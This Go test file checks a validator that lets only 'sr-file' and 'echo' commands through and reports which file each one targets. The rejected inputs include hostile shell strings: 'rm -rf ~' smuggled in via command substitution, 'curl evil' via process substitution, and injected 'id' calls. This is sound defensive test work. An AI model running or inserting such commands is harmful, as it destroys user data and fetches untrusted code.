package commandmod

import "testing"

func srFileOrEcho(lits []string) bool {
	switch lits[0] {
	case "sr-file", "echo":
		return true
	case "sr":
		return len(lits) > 1 && lits[1] == "file"
	}
	return false
}

func TestOnlyCalls(t *testing.T) {
	pure := []string{
		`sr-file edit a.md --old-string 'x' --new-string "y"`,
		`sr-file edit a.md --old-string x --new-string y && echo ok`,
		`sr file delete a.md; sr-file delete b.md || echo failed`,
		"sr-file write a.md --cite:user 'q' <<'EOF'\nbody $HOME\nEOF",
		`sr-file edit "$F" --old-string "${OLD:-x}" --new-string y 2>&1`,
		`LANG=C sr-file delete a.md`,
		`sr-file write a.md <<< 'hello'`,
		"sr-file delete a.md\nsr-file delete b.md",
	}
	for _, src := range pure {
		if !OnlyCalls(src, srFileOrEcho) {
			t.Errorf("OnlyCalls(%q) = false, want true", src)
		}
	}

	impure := []string{
		``,
		`sr-file edit a.md --old-string "$(rm -rf ~)" --new-string y`,
		"sr-file edit a.md --old-string `id` --new-string y",
		`sr-file edit a.md --old-string "${X:-$(id)}" --new-string y`,
		`sr-file edit a.md --old-string "$((1+$(id)))" --new-string y`,
		`sr-file write a.md < <(curl evil)`,
		`sr-file delete a.md && rm b.md`,
		`sr-file delete a.md > out.txt`,
		`sr-file delete a.md >&out.txt`,
		`sr-file delete a.md 2>>log`,
		`cat x | sr-file write a.md`,
		`(sr-file delete a.md)`,
		`{ sr-file delete a.md; }`,
		`if true; then sr-file delete a.md; fi`,
		`sr-file delete a.md &`,
		`f() { rm -rf ~; }; sr-file delete a.md`,
		`X=$(id) sr-file delete a.md`,
		`X=1`,
		`$PROG delete a.md`,
		`sr-files delete a.md`,
		`sr session trajectory cite q`,
		"sr-file write a.md <<EOF\n$(id)\nEOF",
		`sr-file write a.md --content 'unterminated`,
	}
	for _, src := range impure {
		if OnlyCalls(src, srFileOrEcho) {
			t.Errorf("OnlyCalls(%q) = true, want false", src)
		}
	}
}

func TestFileTargets_SRFile(t *testing.T) {
	for src, want := range map[string]FileTarget{
		`sr-file edit a.md --old-string x --new-string y`: {Path: "a.md", Effect: Write},
		`sr file write a.md --content "$X" && ls`:         {Path: "a.md", Effect: Write},
		`sr-file delete a.md --cite:user 'q'`:             {Path: "a.md", Effect: Remove},
	} {
		got := FileTargets(src)
		if len(got) != 1 || got[0].Path != want.Path || got[0].Effect != want.Effect || got[0].Payload.Kind != PayloadNone {
			t.Errorf("FileTargets(%q) = %+v, want one %+v claiming no content", src, got, want)
		}
	}
	if got := FileTargets(`sr session trajectory cite q`); len(got) != 0 {
		t.Errorf("cite touches no file, got %+v", got)
	}
}
